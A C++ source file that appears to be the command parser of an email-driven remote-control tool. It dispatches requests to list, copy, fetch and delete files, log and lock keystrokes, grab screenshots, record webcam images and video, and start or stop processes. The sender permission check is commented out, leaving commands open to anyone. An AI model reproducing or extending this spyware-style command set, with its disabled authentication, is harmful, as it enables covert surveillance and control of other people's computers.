#include "include/request_handle.h"

map<string, map<string, pair<int, Function>>> requestTree = {
    {"file", {
        {"explore", {1, [](vector<string> params) { return showTree(params[0]); }}},
        {"copy",    {2, [](vector<string> params) { return copyFile(params[0], params[1]); }}},
        {"get",     {1, [](vector<string> params) { return getFile(params[0]); }}},
        {"deletebin",   {1, [](vector<string> params) { return deleteFileToBin(params[0]); }}},
        {"deletepmn",   {1, [](vector<string> params) { return deleteFilePermanently(params[0]); }}}
    }},
    {"key", {
        {"log",     {1, [](vector<string> params) { return getKeyLog(stoi(params[0])); }}},
        {"lock",    {1, [](vector<string> params) { return keyLock(stoi(params[0])); }}}
    }},
    {"screen", {
        {"get",     {0, [](vector<string> params) { return getScreenshot("screenshot.png"); }}}
    }},
    {"webcam", {
        {"getimg",  {0, [](vector<string> params) { return getImage("image.jpg"); }}},
        {"getvid",  {1, [](vector<string> params) { return getVideo("video.avi", stoi(params[0])); }}}
    }},
    {"process", {
        {"list",    {0, [](vector<string> params) { return listProcess(); }}},
        {"start",   {1, [](vector<string> params) { return startProcess(params[0]); }}}, 
        {"stop",    {1, [](vector<string> params) { return stopProcess(stoi(params[0])); }}} 
    }},
    {"app", {
        {"list",    {0, [](vector<string> params) { return listApp(); }}},
        {"start",   {1, [](vector<string> params) { return startApp(params[0]); }}}, 
        {"stop",    {1, [](vector<string> params) { return stopApp(stoi(params[0])); }}} 
    }},
    {"help", {
        {"get",     {0, [](vector<string> params) { return showHelp(); }}}
    }}
};

vector<string> tokenize(const string& str) {
    istringstream iss(str);
    vector<string> tokens;
    string token;
    while (iss >> quoted(token)) {
        tokens.push_back(token);
    }
    return tokens;
}

map<string, string> parseRequest(const string& sender, const string& subject, Function& outFunction, vector<string>& outParams) {
    auto response = map<string, string>();
    auto tokens = tokenize(subject);

    // Check sender permission
    /*if (find(whiteList.begin(), whiteList.end(), sender) == whiteList.end()) {
        response["msg"] = "Permission denied.";
        response["command"] = subject;
        return response;
    }*/

    // Validate command prefix
    if (tokens.empty() || tokens[0] != APP_REQ) {
        response["msg"] = "Wrong request format.";
        response["command"] = subject;
        return response;
    }
    tokens.erase(tokens.begin()); // Remove the prefix

    if (tokens.empty()) {
        response["msg"] = "Command not found.";
        response["command"] = subject;
        return response;
    }

    // Determine request tree
    auto it = requestTree.find(tokens[0]);
    if (it == requestTree.end()) {
        response["msg"] = "Command not found.";
        response["command"] = subject;
        return response;
    }

    auto subTree = it->second;
    auto funcIt = subTree.find(tokens[1]);
    if (funcIt == subTree.end()) {
        response["msg"] = "Command not found.";
        response["command"] = subject;
        return response;
    }

    int requiredArgs = funcIt->second.first;
    if (tokens.size() - 2 < requiredArgs) {
        response["msg"] = "Insufficient arguments.";
        response["command"] = subject;
        return response;
    }

    // Prepare function and parameters
    outFunction = funcIt->second.second;
    outParams.assign(tokens.begin() + 2, tokens.begin() + 2 + requiredArgs);

    response["msg"] = "Parse request successfully.";
    response["command"] = subject;
    return response;
}